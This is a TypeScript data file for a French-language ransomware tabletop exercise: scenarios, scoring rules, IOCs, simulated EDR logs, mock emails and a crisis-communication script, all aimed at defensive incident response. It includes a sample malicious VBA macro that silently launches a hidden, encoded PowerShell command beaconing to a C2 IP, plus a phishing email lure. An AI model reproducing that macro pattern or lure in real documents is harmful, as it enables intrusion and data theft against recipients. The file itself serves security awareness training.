export interface ScoreRule {
  label: string
  points: number
  category: 'detection' | 'containment' | 'governance' | 'error'
  pedagogy: string
}

export const SCORE_RULES: ScoreRule[] = [
  { label: 'Signaler rapidement au SOC / Support', points: 2, category: 'detection', pedagogy: 'Le collaborateur alerte dès les premiers signaux anormaux sans tenter de réparer seul.' },
  { label: 'Isoler le poste compromis (Réseau / EDR)', points: 3, category: 'containment', pedagogy: 'Couper la liaison réseau empêche la propagation tout en préservant la mémoire vive volatile pour l’investigation.' },
  { label: 'Contenir la propagation (C2 & segmentation)', points: 3, category: 'containment', pedagogy: 'Bloquer les IP/domaines de Command & Control au pare-feu et isoler les VLANs vulnérables.' },
  { label: 'Identifier l’étendue (EDR, SIEM, logs, IOC)', points: 2, category: 'detection', pedagogy: 'Cartographier avec précision les machines, comptes et partages touchés avant toute reprise.' },
  { label: 'Protéger les comptes & révoquer sessions', points: 2, category: 'containment', pedagogy: 'Réinitialisation contrôlée des identifiants et coupure des jetons OAuth/MFA compromis.' },
  { label: 'Vérifier l’intégrité des sauvegardes hors-ligne', points: 2, category: 'containment', pedagogy: 'Valider la date, l’intégrité et l’absence de compromission avant toute restauration.' },
  { label: 'Mobiliser la cellule de crise (Direction / RSSI)', points: 2, category: 'governance', pedagogy: 'La prise de décision stratégique relève de la gouvernance de crise collégiale, pas du technicien seul.' },
  { label: 'Communication coordonnée et validée', points: 2, category: 'governance', pedagogy: 'Une seule voix officielle : faits avérés uniquement, aucun détail technique exploitable divulgué.' },
  { label: 'Supprimer précipitamment les preuves', points: -2, category: 'error', pedagogy: 'Détruit les traces indispensables aux analystes DFIR et ne neutralise pas la porte dérobée.' },
  { label: 'Communiquer directement aux médias sans validation', points: -3, category: 'error', pedagogy: 'Engage juridiquement l’organisation, expose des faiblesses et alimente la panique.' },
  { label: 'Payer la rançon immédiatement sans analyse', points: -3, category: 'error', pedagogy: 'Finance le crime organisé sans aucune garantie de déchiffrement ; proscrit par la DGSSI.' },
  { label: 'Continuer à utiliser un poste compromis', points: -3, category: 'error', pedagogy: 'Permet à l’attaquant de poursuivre son mouvement latéral et d’exfiltrer des données confidentielles.' },
]

export interface Scenario {
  id: number
  time: string
  duration: string
  title: string
  situation: string[]
  question: string
  expected: { title: string; detail: string }[]
  traps: { bad: string; followUp: string }[]
  keyMessage: string
}

export const SCENARIOS: Scenario[] = [
  {
    id: 0,
    time: '09h00',
    duration: '3 min',
    title: 'Introduction & règles',
    situation: [
      '« Nous allons faire un exercice court et réaliste de gestion d’un incident cyber. Vous êtes placés en situation de crise et devrez prendre des décisions. »',
      '« Il n’y a pas forcément une seule bonne réponse. Ce qui nous intéresse est votre capacité à identifier les priorités et à décider au bon moment. »',
      '« Je vais vous donner les informations progressivement. Vous aurez quelques minutes pour décider de ce que vous faites. »',
      '« Vous êtes maintenant l’équipe responsable de la gestion de l’incident. »',
    ],
    question: 'Constitution des équipes (3 à 5 personnes) — chaque équipe représente une organisation victime d’une cyberattaque.',
    expected: [],
    traps: [],
    keyMessage: 'Les participants ne connaissent pas la suite du scénario.',
  },
  {
    id: 1,
    time: '09h15',
    duration: '5 min',
    title: 'Scénario 1 — Le premier signal',
    situation: [
      'Une collaboratrice (Sophie - RH) reçoit un e-mail : « Mise à jour urgente de votre compte » depuis support@entreprise-support.com.',
      'Il ouvre la pièce jointe Word (Mise_a_jour_compte.docm) et clique sur « Activer le contenu » (macros).',
      'Quelques minutes plus tard, son ordinateur devient très lent et présente des ralentissements inhabituels. Il contacte le support informatique.',
    ],
    question: 'Que faites-vous immédiatement ? (2 minutes de discussion)',
    expected: [
      { title: 'Priorité 1 — Signaler', detail: 'Le collaborateur doit alerter immédiatement le support / SOC / équipe sécurité selon l’organisation.' },
      { title: 'Priorité 2 — Isoler le poste', detail: 'Isoler le poste du réseau (déconnexion filaire/Wi-Fi ou action EDR). Éviter d’éteindre brutalement la machine pour préserver la RAM et les artefacts utiles.' },
      { title: 'Priorité 3 — Ne pas continuer', detail: 'Cesser toute activité, ne pas ouvrir d’autres pièces jointes, ne pas supprimer de fichiers, ne pas tenter de « réparer » soi-même.' },
      { title: 'Priorité 4 — Préserver les preuves', detail: 'Conserver l’e-mail original avec en-têtes RFC822, pièce jointe, heure, utilisateur, logs et alertes EDR.' },
    ],
    traps: [
      { bad: '« On éteint brutalement le PC »', followUp: 'Pourquoi éviter cela ? Éteindre fait perdre la mémoire vive (RAM), les clés de chiffrement volatiles, les connexions actives et l’arbre des processus.' },
      { bad: '« On supprime le document Word »', followUp: 'Détruit la preuve principale nécessaire à l’analyse du hash et à l’extraction des IOC par le SOC.' },
    ],
    keyMessage: 'Le premier réflexe n’est pas de chercher soi-même la cause. Le premier réflexe est ALERTER et CONTENIR.',
  },
  {
    id: 2,
    time: '09h25',
    duration: '5 min',
    title: 'Scénario 2 — La propagation',
    situation: [
      'Le SOC constate des connexions réseau sortantes inhabituelles vers un C2 externe depuis HOST_01.',
      'Trois autres postes (HOST_02, HOST_03) commencent à générer des alertes EDR critiques.',
      'Un serveur de fichiers critique (FS-CORP-01) devient également très lent et présente des accès anormaux via le port SMB 445.',
    ],
    question: 'Quelles sont vos priorités maintenant ? (2 minutes de discussion)',
    expected: [
      { title: '1. Contenir la propagation', detail: 'Isoler d’urgence les machines compromises via l’EDR, bloquer l’IP/domaine C2 au pare-feu, segmenter les flux réseau.' },
      { title: '2. Identifier l’étendue (Scoping)', detail: 'Exploiter l’EDR, le SIEM, les logs Active Directory et les flux réseau pour dénombrer les postes, comptes et serveurs impactés.' },
      { title: '3. Protéger les identités', detail: 'Révoquer les sessions et jetons des comptes compromis (sophie.rh), forcer un changement de mot de passe, désactiver les accès VPN.' },
      { title: '4. Protéger les sauvegardes', detail: 'Vérifier l’étanchéité des sauvegardes hors-ligne. Ne JAMAIS connecter aveuglément un stockage sain au réseau en cours d’infection.' },
    ],
    traps: [
      { bad: '« On redémarre tous les serveurs et postes »', followUp: 'Le malware dispose de mécanismes de persistance et redémarrera, tout en effaçant les traces en RAM.' },
      { bad: '« On branche tout de suite la sauvegarde pour voir »', followUp: 'Risque majeur : le rançongiciel peut chiffrer immédiatement le volume de sauvegarde connecté !' },
    ],
    keyMessage: 'Détecter → Contenir → Analyser → Éradiquer → Restaurer.',
  },
  {
    id: 3,
    time: '09h40',
    duration: '5 min',
    title: 'Scénario 3 — La crise',
    situation: [
      'Plusieurs collaborateurs ne peuvent plus accéder à leurs documents de travail.',
      'Une note d’extorsion apparaît sur le serveur de fichiers : « Vos fichiers ont été chiffrés. Contactez-nous sur Tor pour récupérer vos données. »',
      'La Direction Générale appelle en urgence : « Est-ce une cyberattaque ? Peut-on continuer à travailler ? Combien de temps avant le retour à la normale ? »',
    ],
    question: 'Qui doit prendre la décision concernant la poursuite d’activité ? Faut-il payer la rançon ? Que faire avec les sauvegardes ?',
    expected: [
      { title: 'Gouvernance de crise', detail: 'Ni le collaborateur ni le technicien seuls : décision collégiale en cellule de crise (Direction, RSSI, IT, Métiers, Juridique, DPO).' },
      { title: 'Paiement de la rançon', detail: 'Ne jamais décider dans la précipitation. Position officielle DGSSI : ne pas payer (aucun gage de déchiffrement, finance le crime, ré-attaques fréquentes).' },
      { title: 'Plan de restauration maîtrisé', detail: 'Vérifier intégrité, date, disponibilité et isolement des sauvegardes. Ne restaurer qu’en environnement étanche après éradication certifiée.' },
    ],
    traps: [
      { bad: '« On paie vite les 15 bitcoins pour sauver la clôture comptable »', followUp: 'Statistique DGSSI / maCERT : plus de 50 % des victimes payant ne récupèrent pas l’intégralité de leurs données et sont ré-attaquées.' },
      { bad: '« Le technicien d’astreinte décide seul d’éteindre toute l’usine »', followUp: 'L’arrêt des opérations industrielles ou métiers relève exclusivement de la Direction sur avis du RSSI.' },
    ],
    keyMessage: 'Ne jamais décider du paiement dans la précipitation. La gestion d’une crise est avant tout humaine et stratégique.',
  },
  {
    id: 4,
    time: '09h50',
    duration: '4 min',
    title: 'Scénario 4 — La communication',
    situation: [
      'Une capture d’écran de la note de rançon circule sur un groupe WhatsApp d’employés.',
      'Un journaliste de la presse économique contacte l’accueil : « Confirmez-vous que votre entreprise subit un rançongiciel ? »',
      'Des collaborateurs angoissés demandent : « Que doit-on dire aux clients qui appellent ? »',
    ],
    question: 'Qui communique et que doit-on communiquer ?',
    expected: [
      { title: 'Communication coordonnée et centralisée', detail: 'Une seule voix autorisée (Direction, Communication de crise, RSSI, Juridique). Les collaborateurs ont interdiction stricte de répondre aux médias.' },
      { title: 'Message officiel factuel', detail: '« Une anomalie affectant certains systèmes informatiques fait l’objet d’une investigation par nos équipes. Des mesures de sécurité ont été prises pour contenir l’incident. La priorité est de rétablir les services dans des conditions sécurisées. »' },
      { title: 'Erreurs à proscrire formellement', detail: 'Ne pas donner de détails techniques exploitables, noms d’outils, vulnérabilités, identifiants ou données personnelles. Ne jamais spéculer sur l’attaquant.' },
    ],
    traps: [
      { bad: '« On répond au journaliste qu’on maîtrise la situation et que c’est Sophie qui a cliqué »', followUp: 'Violation du RGPD, mise en cause publique d’un salarié, informations non vérifiées et désastre en relations publiques.' },
      { bad: '« On dément catégoriquement toute attaque »', followUp: 'Si la fuite de données est publiée sur le Dark Web 24h plus tard, la crédibilité de l’entreprise est anéantie.' },
    ],
    keyMessage: 'Une seule voix, des faits vérifiés, zéro spéculation.',
  },
  {
    id: 5,
    time: '10h00',
    duration: '8 min',
    title: 'Débrief & messages clés',
    situation: [
      'L’incident a été contenu grâce à la réactivité collective.',
      'Le formateur anime le débriefing avec les 4 questions fondamentales et formalise les 5 réflexes vitaux.',
    ],
    question: 'Quels sont vos enseignements majeurs ? Analyse de la grille d’évaluation.',
    expected: [],
    traps: [],
    keyMessage: 'En cybersécurité, la technologie ne suffit pas. La rapidité du signalement, la coordination des équipes et la qualité de la prise de décision font toute la différence.',
  },
]

export const DEBRIEF_Q = [
  { q: 'Quelle a été votre première priorité absolue ?', a: 'Alerter immédiatement et isoler le système sans détruire les preuves.' },
  { q: 'Quelle erreur critique aurait pu aggraver irrémédiablement la crise ?', a: 'Continuer à travailler sur la machine, payer précipitamment sans analyse, brancher les sauvegardes sur le réseau infecté, ou communiquer sans validation.' },
  { q: 'Qui intervient dans la chaîne de réponse à incident ?', a: 'Collaborateur → IT/Support → SOC/CSIRT → RSSI → Métiers & DSI → Direction Générale → Juridique / DPO / Communication.' },
  { q: 'Quel est votre principal enseignement pour votre quotidien professionnel ?', a: 'La sécurité est l’affaire de chacun. Signaler rapidement sans crainte de blâme permet de sauver l’organisation avant le chiffrement massif.' },
]

export const REFLEXES = [
  { step: '1', title: 'DÉTECTER', desc: 'Repérer les anomalies, lenteurs inhabituelles et signaux suspects.' },
  { step: '2', title: 'ALERTER', desc: 'Signaler immédiatement au support / SOC selon la procédure interne.' },
  { step: '3', title: 'ISOLER / CONTENIR', desc: 'Déconnecter le réseau, bloquer le C2, préserver les preuves en mémoire.' },
  { step: '4', title: 'ANALYSER / DÉCIDER', desc: 'Évaluer l’impact, mobiliser la cellule de crise, arbitrer la continuité.' },
  { step: '5', title: 'COMMUNIQUER / RESTAURER', desc: 'Parler d’une seule voix validée et restaurer depuis des sauvegardes saines.' },
]

export const INCIDENT_REF = 'INC-2026-0915-01'
export const ORG_NAME = 'Groupe Meridian'

export interface NetworkNode {
  id: string
  name: string
  ip: string
  os: string
  role: string
  vlan: string
  ports: number[]
  status: 'nominal' | 'compromised' | 'isolated' | 'encrypted'
}

export const TOPOLOGY_NODES: NetworkNode[] = [
  { id: 'EXT_C2', name: 'Serveur C2 (Sofia, BG)', ip: '185.22.14.89', os: 'Linux CobaltStrike', role: 'Attaquant Externe', vlan: 'WAN', ports: [443, 8080], status: 'compromised' },
  { id: 'FW_EDGE', name: 'Pare-Feu Périmétrique', ip: '192.168.1.1', os: 'Palo Alto PAN-OS', role: 'Gateway & IPS/IDS', vlan: 'DMZ', ports: [443], status: 'nominal' },
  { id: 'HOST_01', name: 'HOST_01 (Sophie - RH)', ip: '10.0.10.15', os: 'Windows 11 Enterprise', role: 'Poste Utilisateur (Patient Zéro)', vlan: 'VLAN 10 - Postes', ports: [135, 445], status: 'compromised' },
  { id: 'HOST_02', name: 'HOST_02 (Facturation)', ip: '10.0.10.16', os: 'Windows 11 Enterprise', role: 'Poste Comptabilité', vlan: 'VLAN 10 - Postes', ports: [135, 445], status: 'nominal' },
  { id: 'HOST_03', name: 'HOST_03 (RH - Salaires)', ip: '10.0.10.22', os: 'Windows 11 Enterprise', role: 'Poste Ressources Humaines', vlan: 'VLAN 10 - Postes', ports: [135, 445], status: 'nominal' },
  { id: 'DC_CORP_01', name: 'DC-CORP-01 (Contrôleur Domaine)', ip: '10.0.0.5', os: 'Windows Server 2022', role: 'Active Directory & Kerberos', vlan: 'VLAN 20 - Serveurs', ports: [88, 389, 445, 636], status: 'nominal' },
  { id: 'FILE_SERVER', name: 'FS-CORP-01 (Partage Fichiers)', ip: '10.0.0.12', os: 'Windows Server 2022', role: 'Partages SMB & Données Métier', vlan: 'VLAN 20 - Serveurs', ports: [445, 3389], status: 'nominal' },
  { id: 'NAS_VEEAM', name: 'NAS-VEEAM-AIRGAP', ip: '10.0.99.100', os: 'Hardened Linux Repository', role: 'Sauvegardes Immuables', vlan: 'VLAN 99 - Backup', ports: [6162], status: 'nominal' },
]

export const VBA_MACRO_CODE = `' Document_Open déclenché lors de l'activation des macros Word
Private Sub Document_Open()
    On Error Resume Next
    Dim payload As String
    Dim exec As String
    
    ' Chaîne de commande PowerShell obfusquée en Base64
    payload = "powershell.exe -NoP -NonI -W Hidden -Enc aQBmACgAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwA..."
    
    ' Exécution silencieuse en tâche de fond (T1059.001)
    Set wscript = CreateObject("WScript.Shell")
    wscript.Run payload, 0, False
    
    ' Connexion balise vers Command & Control (T1071.001)
    ' Target: https://185.22.14.89:443/beacon.php
End Sub`

export const IOCS = [
  { type: 'IP C2', value: '185.22.14.89:443', context: 'Serveur balise Command & Control (Sofia, BG)', ttp: 'T1071.001' },
  { type: 'Hash SHA256', value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', context: 'Mise_a_jour_compte.docm (Macro malveillante)', ttp: 'T1204.002' },
  { type: 'Domaine Usurpé', value: 'entreprise-support.com', context: 'Typosquatting ciblant le domaine légitime', ttp: 'T1566.001' },
  { type: 'Processus', value: 'powershell.exe -NoP -NonI -W Hidden -Enc ...', context: 'Ligne de commande encodée générée par Word', ttp: 'T1059.001' },
  { type: 'Trafic SMB', value: 'HOST_01 -> FS-CORP-01:445', context: 'Mouvement latéral et chiffrement des partages', ttp: 'T1021.002' },
  { type: 'Extension Rançon', value: '.locked / .meridian_enc', context: 'Fichiers chiffrés par l’algorithme AES-256', ttp: 'T1486' },
]

export const PARK_FILES = [
  { name: 'Cloture_Trimestrielle_Q3.xlsx', owner: 'Compta', size: '3.4 Mo', path: '\\\\FS-CORP-01\\Finances\\2026\\' },
  { name: 'Registre_Salaires_Septembre.xlsx', owner: 'RH', size: '1.8 Mo', path: '\\\\FS-CORP-01\\RH\\Confidentiel\\' },
  { name: 'Contrats_Fournisseurs_Cadre.pdf', owner: 'Juridique', size: '12.1 Mo', path: '\\\\FS-CORP-01\\Legal\\' },
  { name: 'Plans_Techniques_Brevet_2026.dwg', owner: 'R&D', size: '48.5 Mo', path: '\\\\FS-CORP-01\\Projets\\' },
  { name: 'Base_Clients_ERP_Export.sql', owner: 'IT', size: '250.0 Mo', path: '\\\\FS-CORP-01\\Database\\Dumps\\' },
]

export const SESSIONS = [
  { user: 'sophie.rh', source: 'HOST_01 (10.0.10.15)', via: 'Kerberos LAN', suspicious: true, details: 'Connexion active. 47 sollicitations MFA Push nocturnes détectées à 03:14.' },
  { user: 'sophie.rh', source: 'VPN-GATEWAY (185.22.14.89)', via: 'OpenVPN Mobile', suspicious: true, details: 'IP source étrangère correspondant à l’IOC C2. Risque de session hijack.' },
  { user: 'sara.s', source: 'SOC-CONSOLE-02 (10.0.30.12)', via: 'Entra ID FIDO2', suspicious: false, details: 'Analyste SOC niveau 2 certifié. Authentification forte validée.' },
  { user: 'adm.backup', source: 'FS-CORP-01 (10.0.0.12)', via: 'Service Account', suspicious: false, details: 'Compte de service de sauvegarde. Accès restreint au VLAN 99.' },
]

export const STAKEHOLDERS = [
  'Directeur Général',
  'Directrice des Ressources Humaines',
  'RSSI (Responsable Sécurité)',
  'DSI / Responsable Infrastructure',
  'Lead Analyste SOC',
  'Directeur Financier',
  'Responsable Juridique & DPO',
  'Directeur de la Communication',
]

export const VALIDATED_MESSAGE = "Une anomalie affectant certains de nos systèmes informatiques fait actuellement l'objet d'une investigation approfondie par nos équipes techniques et des experts en cybersécurité. Par mesure de précaution, des actions immédiates de confinement et d'isolation ont été déployées afin de préserver l'intégrité de notre environnement. La priorité absolue de l'organisation est d'assurer la continuité des services essentiels et de procéder à un rétablissement progressif dans des conditions de sécurité rigoureusement validées. Nous vous tiendrons informés des évolutions."

export const DIRECTOR_CALL = {
  caller: 'Monsieur Philippe V. (Directeur Général)',
  avatar: '👨‍💼',
  role: 'Direction Générale',
  opening: '« Allô l’équipe de sécurité ? Je viens d’avoir Sophie et la responsable RH au téléphone, tout est bloqué ! Il y a un message en anglais qui réclame des millions de dollars sur le serveur. Est-ce une cyberattaque ? Peut-on continuer à faire tourner l’usine et les factures ? Combien de temps avant que tout refonctionne ? »',
  options: [
    {
      id: 'opt1',
      label: 'Gouvernance collégiale & cellule de crise immédiate',
      good: true,
      response: '« Monsieur le Directeur, nous confirmons un incident majeur avec propagation d’un rançongiciel. La priorité technique est d’isoler le périmètre pour stopper l’hémorragie. Nous devons convoquer immédiatement la cellule de crise (Direction, RSSI, IT, Juridique) dans 15 minutes pour arbitrer la continuité d’activité sans brancher les sauvegardes à l’aveugle. »',
      dgReaction: '« Entendu ! Vous avez parfaitement raison. Je convoque la cellule de crise dans la salle de crise. Tenez-moi au courant de l’état d’isolement du réseau. »',
      score: 2,
    },
    {
      id: 'opt2',
      label: 'Minimiser et promettre un retour sous 10 minutes',
      good: false,
      response: '« Ne vous inquiétez pas Monsieur le Directeur, ce n’est probablement qu’un virus classique. On redémarre le serveur et tout repart d’ici 10 minutes. »',
      dgReaction: '« Vous êtes sûr ? Parce que le chef comptable me dit que tous les fichiers sont renommés en .locked ! Si vous me mentez, les conséquences seront désastreuses ! »',
      score: -2,
    },
    {
      id: 'opt3',
      label: 'Recommander de payer immédiatement la rançon',
      good: false,
      response: '« Monsieur le Directeur, on a perdu la main. Le plus rapide pour sauver la boîte est de payer les 15 bitcoins tout de suite sans attendre. »',
      dgReaction: '« Payer des criminels au hasard ?! Et la loi ? Et les assurances ? Et qui me garantit qu’ils vont nous donner la clé ?! Vous perdez la tête ! »',
      score: -3,
    },
  ],
}

export const AUTO_SCRIPT = [
  { t: 0, scenario: 0, title: 'Briefing initial', text: 'Journée nominale chez Meridian. Les équipes prennent leur poste dans l’infrastructure de production.' },
  { t: 10, scenario: 1, title: 'Réception du courriel piégé', text: 'Sophie (RH) reçoit un courriel urgent usurpant le support interne depuis entreprise-support.com.' },
  { t: 24, title: 'Activation de la macro VBA', text: 'Sophie ouvre la pièce jointe Word et clique sur « Activer le contenu ». Le script PowerShell s’exécute silencieusement.', flag: 'macro' },
  { t: 38, title: 'Premier signal d’incident', text: 'Le poste HOST_01 se ralentit drastiquement. Sophie prévient le support informatique.' },
  { t: 52, scenario: 2, title: 'Alerte EDR & Détection SOC', text: 'Sara (SOC) détecte une commande PowerShell obfusquée (T1059.001) et un canal C2 sortant vers 185.22.14.89.' },
  { t: 66, title: 'Propagation latérale SMB', text: 'L’attaquant pivote via SMB 445 vers HOST_02, HOST_03 et cible le serveur de fichiers FS-CORP-01.', flag: 'c2' },
  { t: 80, title: 'Isolement & Blocage d’urgence', text: 'Le SOC déclenche l’isolement EDR de HOST_01 et bloque l’IP C2 au pare-feu périmétrique.' },
  { t: 96, scenario: 3, title: 'Chiffrement du serveur & Note de rançon', text: '09h40 — Renommage massif en .locked. La note LockBit apparaît sur les partages réseau.' },
  { t: 110, title: 'Hotline de la Direction Générale', text: 'Le Directeur Général appelle en direct : arbitrage de la continuité et interdiction formelle de payer la rançon.' },
  { t: 125, scenario: 4, title: 'Fuite WhatsApp & Appel Journaliste', text: 'Une capture d’écran de la note fuite sur WhatsApp. Un journaliste économique exige des réponses officielles.' },
  { t: 140, title: 'Communication officielle coordonnée', text: 'La cellule de crise valide et diffuse le communiqué institutionnel sans révéler de données techniques.' },
  { t: 155, scenario: 5, title: 'Maîtrise de l’incident & Débriefing', text: 'La menace est contenue, les sauvegardes immuables sont vérifiées. Passage aux 5 réflexes et bilan des scores.' },
]

export const AUTO_TOTAL = 160

export const VOTE_OPTIONS: Record<number, { label: string; good: boolean; explanation: string }[]> = {
  1: [
    { label: 'Isoler le poste du réseau et alerter le SOC sans éteindre le PC', good: true, explanation: 'Action optimale : stoppe la propagation tout en préservant la mémoire RAM pour l’investigation.' },
    { label: 'Éteindre immédiatement la machine à la prise électrique', good: false, explanation: 'Erreur : détruit tous les artefacts volatils en RAM (processus, clés de déchiffrement, sockets réseau).' },
    { label: 'Supprimer le fichier Word suspect et vider la corbeille', good: false, explanation: 'Erreur : détruit la preuve principale sans neutraliser le payload déjà actif en mémoire.' },
    { label: 'Continuer à travailler normalement en ignorant le ralentissement', good: false, explanation: 'Erreur critique : laisse le malware déployer son mouvement latéral vers les serveurs.' },
  ],
  2: [
    { label: 'Isoler les 3 postes, bloquer l’IP C2 au pare-feu et révoquer les sessions', good: true, explanation: 'Confinement complet : coupe les communications malveillantes et neutralise les jetons d’accès.' },
    { label: 'Redémarrer l’ensemble des serveurs du domaine Active Directory', good: false, explanation: 'Erreur : ne résout pas la compromission et peut corrompre les états des services critiques.' },
    { label: 'Brancher immédiatement le disque dur de sauvegarde sur le serveur', good: false, explanation: 'Piège gravissime : le rançongiciel chiffrera instantanément la sauvegarde connectée !' },
    { label: 'Attendre de voir si d’autres machines ralentissent avant d’agir', good: false, explanation: 'Erreur : la rapidité de confinement dans les 10 premières minutes est décisive pour éviter le désastre.' },
  ],
  3: [
    { label: 'Activer la cellule de crise, interdire le paiement et contrôler les sauvegardes', good: true, explanation: 'Posture conforme DGSSI : décision collégiale, refus du chantage et vérification étanche des backups.' },
    { label: 'Payer immédiatement les 15 bitcoins pour récupérer la clé au plus vite', good: false, explanation: 'Proscrit par la DGSSI : finance le cybercrime, aucune garantie de clé et risque de ré-attaque sous 6 mois.' },
    { label: 'Laisser le technicien décider seul d’éteindre toute l’infrastructure', good: false, explanation: 'Erreur de gouvernance : l’arrêt d’activité métier relève exclusivement de la Direction Générale.' },
    { label: 'Restaurer les sauvegardes directement sur le réseau sans éradication', good: false, explanation: 'Erreur : les données saines réinjectées sur un réseau infecté seront chiffrées à nouveau.' },
  ],
  4: [
    { label: 'Diffuser le communiqué officiel validé avec une seule voix autorisée', good: true, explanation: 'Communication de crise exemplaire : faits vérifiés, rassurante, sans divulgation de failles.' },
    { label: 'Répondre directement au journaliste pour lui expliquer que c’est la faute de Sophie', good: false, explanation: 'Faute grave : atteinte aux salariés, violation du RGPD et responsabilité juridique de l’entreprise.' },
    { label: 'Publier la liste de tous les serveurs chiffrés sur les réseaux sociaux', good: false, explanation: 'Erreur : donne des informations stratégiques aux cybercriminels et alimente la panique.' },
    { label: 'Nier catégoriquement l’attaque en affirmant qu’il s’agit d’une simple panne électrique', good: false, explanation: 'Erreur fatale : si les pirates publient les données volées, la crédibilité de l’entreprise est anéantie.' },
  ],
}

export const EDR_LOGS = [
  { t: '09:15:32', level: 'info', host: 'HOST_01', process: 'OUTLOOK.EXE (PID 4892)', msg: 'Ouverture de pièce jointe : Mise_a_jour_compte.docm', minScenario: 1 },
  { t: '09:16:04', level: 'warn', host: 'HOST_01', process: 'WINWORD.EXE (PID 6104)', msg: 'Exécution de macro VBA autorisée par l’utilisateur', minScenario: 1 },
  { t: '09:17:18', level: 'crit', host: 'HOST_01', process: 'powershell.exe (PID 7844)', msg: 'EDR DETECT : PowerShell obfusqué avec paramètre -W Hidden -Enc (MITRE T1059.001)', minScenario: 2 },
  { t: '09:20:45', level: 'crit', host: 'HOST_01', process: 'beacon.exe (PID 8310)', msg: 'Connexion réseau sortante vers 185.22.14.89:443 (C2 Sofia, BG - MITRE T1071.001)', minScenario: 2 },
  { t: '09:24:12', level: 'warn', host: 'HOST_02', process: 'lsass.exe (PID 912)', msg: 'Tentative de dumping de credentials mémoire (Mimikatz signature - MITRE T1003)', minScenario: 2 },
  { t: '09:26:50', level: 'crit', host: 'FS-CORP-01', process: 'smb_server', msg: 'Flux SMB anormal depuis 10.0.10.15:445 — énumération de partages administratifs C$, ADMIN$', minScenario: 2 },
  { t: '09:33:14', level: 'warn', host: 'HOST_03', process: 'svchost.exe', msg: 'Création d’un service distant suspect via PsExec (MITRE T1569.002)', minScenario: 2 },
  { t: '09:39:55', level: 'crit', host: 'FS-CORP-01', process: 'crypto_payload.exe', msg: 'ALERTE MAJEURE : Renommage massif de fichiers en .locked sur \\\\FS-CORP-01\\Partages (T1486)', minScenario: 3 },
  { t: '09:41:20', level: 'crit', host: 'FS-CORP-01', process: 'ransom_note', msg: 'Dépôt de fichier README_LOCKED_RESTORE.txt sur l’ensemble des répertoires partagés', minScenario: 3 },
]

export const MAILS = [
  {
    id: 'm1',
    from: 'support@entreprise-support.com',
    fromName: 'Support Informatique IT',
    to: 'sophie.rh@meridian-groupe.fr',
    subject: '⚠️ Mise à jour urgente de votre compte utilisateur Meridian',
    time: '09h12',
    phishing: true,
    headers: {
      returnPath: '<bounce-service-5892@entreprise-support.com>',
      replyTo: 'security-check@185.22.14.89',
      spf: 'FAIL (ip=185.22.14.89 does not match meridian-groupe.fr)',
      dkim: 'none (message non signé cryptographiquement)',
      dmarc: 'quarantine (politique non respectée)',
      clientIp: '185.22.14.89 (Sofia, Bulgarie)',
      typosquattingAlert: 'ATTENTION : domaine expéditeur entreprise-support.com usurpant meridian-groupe.fr',
    },
    body: `Bonjour Sophie,

Dans le cadre du renforcement des protocoles de sécurité interne du Groupe Meridian, une synchronisation obligatoire de votre compte professionnel est requise avant 12h00 ce jour.

À défaut, votre accès aux serveurs de facturation et à la messagerie sera suspendu conformément à la politique IT.

Veuillez ouvrir le document récapitulatif ci-joint et cliquer sur « ACTIVER LE CONTENU » sur le bandeau jaune supérieur de Microsoft Word afin de valider vos accès réseau.

Bien cordialement,
Le Service Support & Infrastructure Informatique
Groupe Meridian — Hotline interne : poste 4402`,
    attachment: 'Mise_a_jour_compte_RH.docm',
    attachmentSize: '142 Ko',
  },
  {
    id: 'm2',
    from: 'soc@meridian-groupe.fr',
    fromName: 'Sara S. (Analyste SOC)',
    to: 'all-it@meridian-groupe.fr',
    subject: '[ALERTE SOC S1] Comportement anormal détecté sur HOST_01',
    time: '09h22',
    phishing: false,
    minScenario: 2,
    body: `Bonjour à tous,

Nos sondes EDR viennent de lever une alerte de sévérité CRITIQUE sur la station de travail HOST_01 (Sophie - RH).

Processus suspect : exécution PowerShell encodée en tâche de fond suivie d’une tentative de communication réseau externe.

Consigne stricte : NE PAS ÉTEINDRE LA MACHINE. L’isoler immédiatement du réseau filaire et Wi-Fi pour préserver la mémoire volatile et attendre les instructions de réponse à incident.

Sara S. — Analyste SOC Niveau 2`,
  },
  {
    id: 'm3',
    from: 'direction.generale@meridian-groupe.fr',
    fromName: 'Philippe V. (Directeur Général)',
    to: 'direction-comite@meridian-groupe.fr',
    subject: 'CRIS-SEC : Réunion d’urgence Cellule de Crise à 10h00',
    time: '09h46',
    phishing: false,
    minScenario: 3,
    body: `Mesdames et Messieurs les membres du Comité de Direction,

Un incident de cybersécurité majeur affecte actuellement nos serveurs de fichiers et plusieurs postes de travail.

Une cellule de crise se réunit immédiatement en salle du Conseil et en conférence sécurisée.

Tous les arbitrages relatifs à la poursuite de l’activité, au contact avec les assureurs, à la DGSSI (maCERT) et à la communication externe seront pris lors de cette séance.

Philippe V. — Directeur Général`,
  },
]

export const WHATSAPP = [
  { author: 'Sophie (RH)', text: 'Quelqu’un d’autre a reçu le mail du support ? Mon PC est devenu super lent et mes icônes ont changé 😱', time: '09h18', minScenario: 1 },
  { author: 'Thomas (Facturation)', text: 'Moi aussi j’ai eu un truc bizarre. Ça me dit que le serveur de fichiers ne répond plus...', time: '09h27', minScenario: 2 },
  { author: 'Sara (SOC)', text: 'Message d’alerte : ne touchez plus aux postes lents. Débranchez les câbles réseau, ne les éteignez surtout pas.', time: '09h31', minScenario: 2 },
  { author: 'Léa (RH)', text: 'Oh non regardez ma capture... il y a une tête de mort et ça demande 15 bitcoins sur le serveur commun !! [Capture écran]', time: '09h48', minScenario: 3 },
  { author: 'Collègue Informatique', text: 'Supprimez vos captures du groupe WhatsApp, l’info commence déjà à sortir à l’extérieur...', time: '09h51', minScenario: 4 },
  { author: 'Journaliste — BFM Eco / La Voix', text: 'Bonjour Monsieur, nous avons vent d’une cyberattaque de type ransomware bloquant Meridian ce matin. Nous préparons un article, avez-vous un commentaire officiel ?', time: '09h54', minScenario: 4 },
]
